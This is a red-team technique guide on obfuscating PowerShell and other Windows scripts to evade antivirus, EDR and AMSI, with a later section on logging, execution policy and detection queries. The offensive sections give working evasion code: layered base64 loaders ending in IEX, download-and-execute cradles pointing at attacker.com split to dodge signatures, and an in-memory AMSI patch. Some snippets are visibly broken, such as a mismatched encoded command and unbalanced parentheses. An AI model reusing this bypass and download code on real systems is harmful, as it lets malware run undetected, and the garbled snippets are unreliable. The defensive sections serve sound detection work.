# [EVADE-OBFUS-001]: Obfuscated Scripts

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-OBFUS-001 |
| **MITRE ATT&CK v18.1** | [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows Endpoint (PowerShell, VBScript, Batch, CMD) |
| **Severity** | High |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows 7 SP1, Server 2008 R2, and all subsequent versions |
| **Patched In** | No patch (AMSI bypass is continuous cat-and-mouse game) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Script obfuscation involves encoding, encrypting, or otherwise disguising PowerShell, VBScript, Batch, or other scripting content to evade detection by security tools (antivirus, EDR, AMSI). Attackers use multiple obfuscation layers—such as base64 encoding, string concatenation, variable aliasing, command substitution, and environment variable expansion—to create scripts that are functionally identical to malicious payloads but unrecognizable to signature-based detection mechanisms. Tools like **Invoke-Obfuscation** automate this process, creating polymorphic scripts with randomized variable names, split strings, and complex expressions.

**Attack Surface:** PowerShell (ScriptBlock execution), CMD.exe (command-line arguments), WScript.exe (VBScript), Windows Batch (.bat/.cmd files), registry-based script storage.

**Business Impact:** **Successful evasion of security monitoring, allowing execution of malicious scripts without detection.** Obfuscated scripts enable ransomware deployment, credential harvesting, data exfiltration, and privilege escalation to proceed undetected. When combined with execution aliases and dynamic invocation, scripts bypass even behavior-based detection systems.

**Technical Context:** Traditional detection relies on recognizable patterns: `powershell`, `-EncodedCommand`, `IEX`, `DownloadString`, `FromBase64String`, etc. Obfuscation replaces these with variations: aliases for `IEX` (e.g., `&{}`, `&$()`, `IEX|?`, etc.), substring variables for command names, base64-encoded payloads with multi-step decoding, and inline compression. AMSI (introduced in Windows 10/Server 2016) added behavioral inspection at script runtime, but numerous AMSI bypass techniques exist and are regularly updated.

### Operational Risk

- **Execution Risk:** Low—Scripts can be executed as any user without special privileges
- **Stealth:** High—Well-obfuscated scripts evade signature-based AV/EDR, AMSI, and log-based detection
- **Reversibility:** Not applicable (script execution is transient unless persistence is added)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.6.1 | Ensure PowerShell execution policy is set to Restricted or AllSigned |
| **DISA STIG** | V-93311 | Windows Server: Restrict PowerShell script execution |
| **NIST 800-53** | SI-4 | Information System Monitoring – Detect suspicious script activity |
| **GDPR** | Art. 32 | Security of Processing – Log script execution |
| **NIS2** | Art. 21 | Cyber Risk Management – Detect obfuscated malware |
| **ISO 27001** | A.12.4.1 | Event Logging – Monitor and log all script executions |
| **ISO 27005** | Risk Assessment | Malware and Attack Vector Execution |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** User or higher (scripts can be executed by any user)
- **Required Access:** Execution context (shell, scheduled task, remote execution)
- **Supported Versions:**
  - **Windows 7 SP1:** Vulnerable (basic obfuscation detection only)
  - **Windows 8/8.1:** Vulnerable
  - **Windows 10 (pre-1909):** Vulnerable (limited AMSI)
  - **Windows 10 (1909+):** Partially vulnerable (AMSI present but bypassable)
  - **Windows 11:** Partially vulnerable (enhanced AMSI but still bypassable)
  - **Windows Server 2008 R2 - 2025:** All partially vulnerable

**Prerequisites:**
- Execution engine installed (PowerShell, VBScript, CMD.exe)
- Execution policy permissive (or bypass available)
- Script delivery mechanism (email, web, shared drive, etc.)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Base64 Encoding with Multi-Decoding Layers

**Supported Versions:** All Windows versions with PowerShell 2.0+

#### Step 1: Create Malicious PowerShell Script

**Objective:** Create a proof-of-concept script demonstrating obfuscation detection evasion.

**PowerShell Script (Malicious Payload - PoC):**
```powershell
# Example malicious payload (PoC - creates test file)
Write-Host "This is a test payload"
New-Item -Path "C:\Temp\test.txt" -ItemType File -Value "Obfuscation Test" -Force
```

**What This Means:**
- This is a simple payload that would normally be easily detected by AV/EDR
- Recognized keywords: `Write-Host`, `New-Item`, etc.
- AMSI would flag this immediately

#### Step 2: Encode the Script

**Objective:** Convert the script into base64 format, then encode that, creating multiple layers.

**PowerShell Command (Single Layer Base64):**
```powershell
$payload = @'
Write-Host "This is a test payload"
New-Item -Path "C:\Temp\test.txt" -ItemType File -Value "Obfuscation Test" -Force
'@

# Convert to Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)

Write-Host "Encoded Payload:"
Write-Host $encoded
```

**Expected Output:**
```
Encoded Payload:
VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGkAcwAgAGEAIAB0AGUAcwB0ACAAcABhAHkAbABvAGEAZAAiAA0ACgBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFQAZQBtAHAAXAB0AGUAcwB0AC4AdAB4AHQAIgAgAC0ASQB0AGUAbQBUAHkAcABlACAAIgBGAGkAbABlACIAIAAtAFYAYQBsAHUAZQAgACIATwBiAGYAdQBzAGMAYQB0AGkAbwBuACAA
```

#### Step 3: Execute Encoded Script Using -EncodedCommand

**Objective:** Execute the base64-encoded payload using PowerShell's `-EncodedCommand` parameter.

**PowerShell Command (Execute):**
```powershell
# This command executes the base64-encoded script
powershell.exe -NoProfile -EncodedCommand "VwByAGkAdABlAC0ASABvAHMAdAAgACIAVABoAGkAcwAgAGkAcwAgAGEAIAB0AGUAcwB0ACAAcABhAHkAbABvAGEAZAAiAA0ACgBOAGUAdwAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFQAZQBtAHAAXAB0AGUAcwB0AC4AdAB4AHQAIgAgAC0ASQB0AGUAbQBUAHkAcABlACAAIgBGAGkAbABlACIAIAAtAFYAYQBsAHUAZQAgACIATwBiAGYAdXNjYXRpb24gVGVzdCIgLUZvcmNl"
```

**Expected Output:**
- Script executes without showing the actual command
- File `C:\Temp\test.txt` is created
- Detection tools see only: `-EncodedCommand`, not the malicious code

**OpSec & Evasion:**
- `-EncodedCommand` bypasses execution policy automatically
- Actual command is hidden from command-line monitoring (though still appears in Process Creation events with partial data)
- ScriptBlock logging (Event ID 4104) may still capture the decoded script, but many systems don't have this enabled

#### Step 4: Multi-Layer Obfuscation (Deeper Evasion)

**Objective:** Apply multiple layers of encoding/compression to evade AMSI and log-based detection.

**PowerShell (Double-Layered Obfuscation):**
```powershell
# Original payload
$payload = "Write-Host 'Obfuscated'; New-Item -Path C:\Temp\test.txt -ItemType File -Force"

# Layer 1: Base64
$bytes1 = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded1 = [Convert]::ToBase64String($bytes1)

# Layer 2: Reverse the string
$reversed = $encoded1[-1..-($encoded1.length)] -join ''

# Layer 3: Encode reversed as Base64
$bytes2 = [System.Text.Encoding]::Unicode.GetBytes($reversed)
$encoded2 = [Convert]::ToBase64String($bytes2)

# Execution script
$exec = @"
`$x = [Convert]::FromBase64String('$encoded2')
`$y = [System.Text.Encoding]::Unicode.GetString(`$x)
`$z = `$y[-1..-(` $y.length)] -join ''
`$a = [Convert]::FromBase64String(`$z)
IEX ([System.Text.Encoding]::Unicode.GetString(`$a))
"@

Write-Host $exec
```

**Execution:**
```powershell
powershell.exe -NoProfile -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($exec)))
```

**Effect:**
- Payload is encoded twice and reversed, making static signature detection nearly impossible
- Requires AMSI or behavioral analysis to detect
- Many EDR solutions will miss this variant

---

### METHOD 2: String Concatenation & Character Substitution

**Supported Versions:** All Windows versions with PowerShell

#### Step 1: Obfuscate Using String Concatenation

**Objective:** Break command strings into parts to avoid signature matching.

**PowerShell (Original - Easy to Detect):**
```powershell
Invoke-WebRequest -Uri "http://attacker.com/malware.ps1" | Invoke-Expression
```

**PowerShell (Obfuscated - Harder to Detect):**
```powershell
# Break the command into pieces
$c = "Invo"+"ke-We"+"bRequest"
$u = "http://att"+"acker.c"+"om/malware.ps1"
$i = "Invo"+"ke-Exp"+"ression"

# Execute using variable substitution
& $c -Uri $u | & $i
```

**Or using concatenation within parentheses:**
```powershell
("Invo"+"ke-E"+"xpression") New-Object Net.WebClient).DownloadString("http://attacker.com/payload.ps1")
```

**OpSec & Evasion:**
- Signature-based detection looks for exact command names
- This variant breaks string matching
- AMSI still detects at runtime unless further obscured

---

### METHOD 3: Invoke-Obfuscation Framework (Automated)

**Supported Versions:** All Windows versions with PowerShell 2.0+

#### Step 1: Install Invoke-Obfuscation

**Objective:** Use the Invoke-Obfuscation framework for automated, polymorphic script obfuscation.

**PowerShell Installation:**
```powershell
# Download Invoke-Obfuscation from GitHub
$repo = "https://raw.githubusercontent.com/danielbohannon/Invoke-Obfuscation/master"
$file = "Invoke-Obfuscation.ps1"

Invoke-WebRequest -Uri "$repo/$file" -OutFile "$env:TEMP\Invoke-Obfuscation.ps1"

# Import the module
Import-Module "$env:TEMP\Invoke-Obfuscation.ps1"
```

**Expected Output:**
```
Module loaded successfully
```

#### Step 2: Generate Obfuscated Script

**Objective:** Use Invoke-Obfuscation to create a polymorphic obfuscated version.

**PowerShell Command:**
```powershell
$scriptPath = "C:\malicious.ps1"
$obfuscatedScript = Invoke-Obfuscation -ScriptPath $scriptPath -Command 'Encoding\Base64 -EncodedCommand'

Write-Host $obfuscatedScript
```

**Or interactively:**
```powershell
Invoke-Obfuscation

# Then at prompt:
# > set ScriptPath C:\malicious.ps1
# > encoding
# > base64 | encodecommand
# > out C:\obfuscated.ps1
```

**Expected Output:**
```
Obfuscation Options:
- Token Obfuscation
- String Obfuscation
- Variable Obfuscation
- Command Substitution
- Encoding (Base64, Hex, ASCII, etc.)

Output: obfuscated.ps1 (10-20% larger than original due to encoding)
```

**Verification (Run Obfuscated):**
```powershell
# Execute the obfuscated script
. C:\obfuscated.ps1
```

**OpSec & Evasion:**
- Invoke-Obfuscation creates unique variations each time (polymorphic)
- Combines multiple obfuscation techniques (token randomization + encoding + string substitution)
- Still vulnerable to AMSI ScriptBlock logging but bypasses signature-based AV

---

### METHOD 4: AMSI Bypass Techniques

**Supported Versions:** Windows 10+, Server 2016+ (with PowerShell 5.0+)

#### Step 1: AMSI Patching (In-Memory Bypass)

**Objective:** Disable AMSI at runtime to allow execution of flagged scripts.

**PowerShell (Patch AMSI in Memory):**
```powershell
# AMSI bypass via reflection patching
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;

public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

# Locate AMSI.dll in memory
$amsi = [ZQCUW]::LoadLibrary("amsi.dll")
$addr = [ZQCUW]::GetProcAddress($amsi, "AmsiScanBuffer")

# Patch: Replace first bytes with "return 0" (0xC3)
$VirtualProtect = [ZQCUW]::VirtualProtect
$VirtualProtect.Invoke($addr, [UIntPtr]1, 0x40, [ref]0) | Out-Null

[System.Runtime.InteropServices.Marshal]::WriteByte($addr, 0xC3)

# Now malicious code runs undetected
Write-Host "AMSI disabled. Executing protected code..."
```

**Expected Outcome:**
- AMSI is patched in memory
- Any subsequent script execution in this PowerShell session bypasses AMSI checks
- Malicious scripts execute without detection

**Detection Indicators:**
- Event ID 4688 (Process Creation) shows PowerShell with reflection/pinvoke usage
- ScriptBlock logging (Event ID 4104) captures the reflection code
- EDR tools detect memory patching attempts

---

### METHOD 5: IEX Obfuscation & Aliases

**Supported Versions:** All PowerShell versions

#### Step 1: Hide Invoke-Expression (IEX)

**Objective:** Disguise the IEX command using aliases and variable substitution.

**PowerShell Examples:**

```powershell
# Standard IEX (easily detected)
$payload = "Write-Host 'Malicious'"
IEX $payload

# Obfuscated Variant 1: Using Get-Alias
$payload = "Write-Host 'Malicious'"
& (Get-Alias iex) $payload

# Obfuscated Variant 2: Using wildcard matching
$payload = "Write-Host 'Malicious'"
& (Get-Command i*x) $payload

# Obfuscated Variant 3: Using character codes
$payload = "Write-Host 'Malicious'"
$iex = [char]73 + [char]69 + [char]88  # "IEX"
& (Get-Command $iex) $payload

# Obfuscated Variant 4: Globfuscation (wildcard expansion)
$payload = "Write-Host 'Malicious'"
.  ( $env:ComSpec[4,15,25]-join'') $payload

# Obfuscated Variant 5: Via variable assignment and invocation
$payload = "Write-Host 'Malicious'"
$ExecutionContext.InvokeCommand.InvokeScript($payload)
```

**OpSec & Evasion:**
- Each variant avoids the literal string "IEX"
- Signature-based detection looks for "IEX"
- These variants evade that signature
- AMSI still detects at runtime unless combined with AMSI bypass

---

## 4. ATOMIC RED TEAM

**Atomic Test ID:** T1027.010-1 (Command Obfuscation)

**Test Name:** Obfuscate Script with Base64 Encoding

**Command:**
```powershell
# Create malicious script
$malicious = "Write-Host 'Detected!'; Get-Process"

# Encode
$bytes = [System.Text.Encoding]::Unicode.GetBytes($malicious)
$encoded = [Convert]::ToBase64String($bytes)

# Execute obfuscated
powershell.exe -NoProfile -EncodedCommand $encoded
```

**Cleanup Command:**
```powershell
# No persistent artifacts to clean (script execution is transient)
Remove-Item -Path "$env:TEMP\obfuscated.ps1" -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team - T1027.010](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.010/T1027.010.md)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enable PowerShell ScriptBlock Logging (Event ID 4104)**

Capture the decoded content of scripts at runtime.

**Manual Steps (Enable ScriptBlock Logging via GPO):**

1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows PowerShell**
3. Set **Turn on PowerShell Script Block Logging**:
   - **Enabled** ✅
   - **Option:** Log all script blocks
4. Run `gpupdate /force` on target machines

**Manual Steps (Local Policy):**
```powershell
$regPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWORD -Force
```

**Verification:**
```powershell
# Check if logging is enabled
Get-ItemProperty -Path $regPath -Name "EnableScriptBlockLogging"
```

**Expected Output (Enabled):**
```
EnableScriptBlockLogging : 1
```

**Result:**
- Event ID 4104 captures decoded PowerShell scripts in Security event log
- Obfuscated scripts are decoded before execution and logged
- Blue Team can see what actually runs, not just the obfuscated version

---

**Mitigation 2: Restrict PowerShell Execution Policy**

Prevent unsigned scripts from executing.

**Manual Steps (Set Execution Policy via GPO):**

1. **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows PowerShell**
3. Set **Turn on Script Execution**:
   - **Enabled**
   - **Execution Policy:** AllSigned or RemoteSigned
4. `gpupdate /force`

**Manual Steps (Local Machine):**
```powershell
# Restrict to AllSigned (only signed scripts allowed)
Set-ExecutionPolicy -ExecutionPolicy AllSigned -Scope LocalMachine -Force

# Verify
Get-ExecutionPolicy
```

**Expected Output:**
```
AllSigned
```

**Result:**
- Scripts must be digitally signed by a trusted certificate
- Obfuscated scripts cannot be executed unless signed
- Creates signature chain audit trail

---

**Mitigation 3: Deploy AMSI-Aware EDR/XDR Solutions**

Use tools that monitor AMSI callbacks and detect obfuscation attempts.

**Tools:**
- Microsoft Defender for Endpoint (MDE)
- CrowdStrike Falcon
- SentinelOne
- Carbon Black
- Elastic EDR

**Configuration:**
- Enable behavioral threat detection
- Set to block (not just log) suspicious script execution
- Configure alerts for AMSI bypass attempts

---

### Priority 2: HIGH

**Mitigation 4: Monitor for Base64 Encoding & -EncodedCommand**

Alert on suspicious PowerShell command patterns.

**Manual Steps (Create Detection Rule in Sentinel/Splunk):**

**KQL (Microsoft Sentinel):**
```kusto
DeviceProcessEvents
| where ProcessCommandLine contains "-EncodedCommand" or ProcessCommandLine contains "-e" 
| where ProcessCommandLine contains "powershell"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessAccountName
| order by TimeGenerated desc
```

**Splunk SPL:**
```
index=main source=WinEventLog:Security CommandLine="*powershell*" 
(CommandLine="*-EncodedCommand*" OR CommandLine="*-e *")
| stats count by host, user
| where count > 5
```

**Triggering Alert:**
- Each time PowerShell runs with `-EncodedCommand`
- Baseline: Most legitimate scripts use AllSigned, not encoding

**Expected Output:**
```
DeviceName: WORKSTATION01
ProcessCommandLine: powershell.exe -NoProfile -EncodedCommand VwByAGkAdGUA...
AlertLevel: Medium
```

---

**Mitigation 5: Block Suspicious Script Execution Patterns**

Use Application Control (AppLocker/Windows Defender Application Control).

**Manual Steps (Deploy AppLocker Rule for Script Execution):**

1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Application Control Policies** → **AppLocker**
3. Right-click **Script Rules** → **Create New Rule**
4. Set:
   - **Action:** Deny
   - **Conditions:** Publisher is NOT `Microsoft Corporation` AND (Path contains `\Temp\` OR Path contains `\AppData\`)
5. **Create**

**Expected Outcome:**
- Scripts from suspicious locations are blocked
- Obfuscated scripts in temp directories cannot execute

---

**Mitigation 6: Monitor File Less Attacks**

Detect scripts stored in registry, WMI, or memory.

**PowerShell Detection Script:**
```powershell
# Check for scripts in registry
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" |
  Where-Object { $_ -match "powershell|cmd|vbs" } |
  ForEach-Object { Write-Host "Suspicious registry entry found: $_" }

# Check for WMI event subscriptions (fileless persistence)
Get-WmiObject __EventFilter -Namespace root\subscription

# Check for running scripts in memory
Get-Process | Where-Object { $_.Name -eq "powershell" } | 
  ForEach-Object { Get-Process -Id $_.Id | Select-Object -ExpandProperty CommandLine }
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Command-line:** PowerShell with `-EncodedCommand`, `-E`, `-NoProfile`, `-NoLogging`, `-ExecutionPolicy Bypass`
- **File Artifacts:** `.ps1`, `.vbs`, `.bat`, `.cmd` files in suspicious locations (`\Temp\`, `\AppData\Local\Temp\`, `%USERPROFILE%\Downloads\`)
- **Registry:** Scripts stored in `HKCU:\Software\`, `HKLM:\Software\Microsoft\Windows\Run`
- **Event Logs:**
  - Event ID 4104 (ScriptBlock Logging) with suspicious content
  - Event ID 4688 (Process Creation) with PowerShell parent process spawning CMD/WScript
  - Event ID 3001 (WMI Event Subscription)

### Detection Queries

**PowerShell Event Log Query (ScriptBlock Logging):**
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[(EventID=4104)]]" |
  Where-Object { $_.Message -match "base64|encoding|compress|frombase64|invocation" } |
  Select-Object TimeCreated, Message
```

**Process Command-Line Monitoring:**
```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4688)]] and *[EventData[Data[@Name='CommandLine'] and (contains(., '-EncodedCommand') or contains(., '-e '))]]" |
  Select-Object TimeCreated, @{N="CommandLine";E={$_.Properties[8].Value}}
```

### Response Procedures

1. **Detect:** Alert triggers on ScriptBlock logging with obfuscation indicators
2. **Isolate:** Disconnect affected system from network
3. **Investigate:**
   - Check Event ID 4104 for decoded script content
   - Determine what the script does
   - Find lateral movement artifacts
4. **Remediate:**
   - Remove malicious scripts
   - Review PowerShell execution history
   - Patch system if script exploited a vulnerability

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | User receives phishing email with obfuscated script link |
| **2** | **Execution** | **[EVADE-OBFUS-001]** | **Obfuscated script bypasses AV/EDR detection** |
| **3** | **Persistence** | [CA-STORE-001] DPAPI Credential Decryption | Script decrypts stored credentials |
| **4** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Hash | Script uses stolen credentials to move laterally |
| **5** | **Impact** | [IMPACT-001] Data Exfiltration | Obfuscated script exfiltrates sensitive data |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Cobalt Strike Beacon Delivery (2023-2024)

- **Target:** Enterprise environments with weak script monitoring
- **Timeline:** Ongoing throughout 2023-2024
- **Technique Status:** Cobalt Strike payloads are obfuscated using Invoke-Obfuscation variants
- **Detection:** Most caught by AMSI when ScriptBlock logging not enabled; missed by signature-only AV
- **Impact:** Widespread C2 compromise in organizations lacking log monitoring
- **Reference:** [Cobalt Strike Analysis](https://www.cobaltstrike.com/)

### Example 2: Emotet Malware Campaign (2019-2021)

- **Target:** Banking and financial institutions
- **Timeline:** November 2019 - January 2021 (disrupted)
- **Technique Status:** Emotet used heavily obfuscated PowerShell scripts to download and execute payloads
- **Detection:** Most variants bypassed signature-based AV; caught by behavioral analysis and AMSI
- **Impact:** ~2.5 million infections globally before takedown
- **Reference:** [CISA Alert AA20-283A](https://www.cisa.gov/news-events)

---

## EVASION TOOLKIT RECOMMENDATIONS

For authorized security testing and purple teaming:

1. **Invoke-Obfuscation** - [GitHub](https://github.com/danielbohannon/Invoke-Obfuscation)
2. **Invoke-DOSfuscation** - [GitHub](https://github.com/danielbohannon/Invoke-DOSfuscation)
3. **AMSITrigger** - [GitHub](https://github.com/RythmStick/AMSITrigger)
4. **Veil Framework** - [GitHub](https://github.com/Veil-Framework/Veil)
5. **pe-sieve** - Memory scanning tool for detecting injected code

**Disclaimer:** These tools should only be used in authorized security testing and red team engagements with proper Rules of Engagement (RoE) and contractual agreements.

---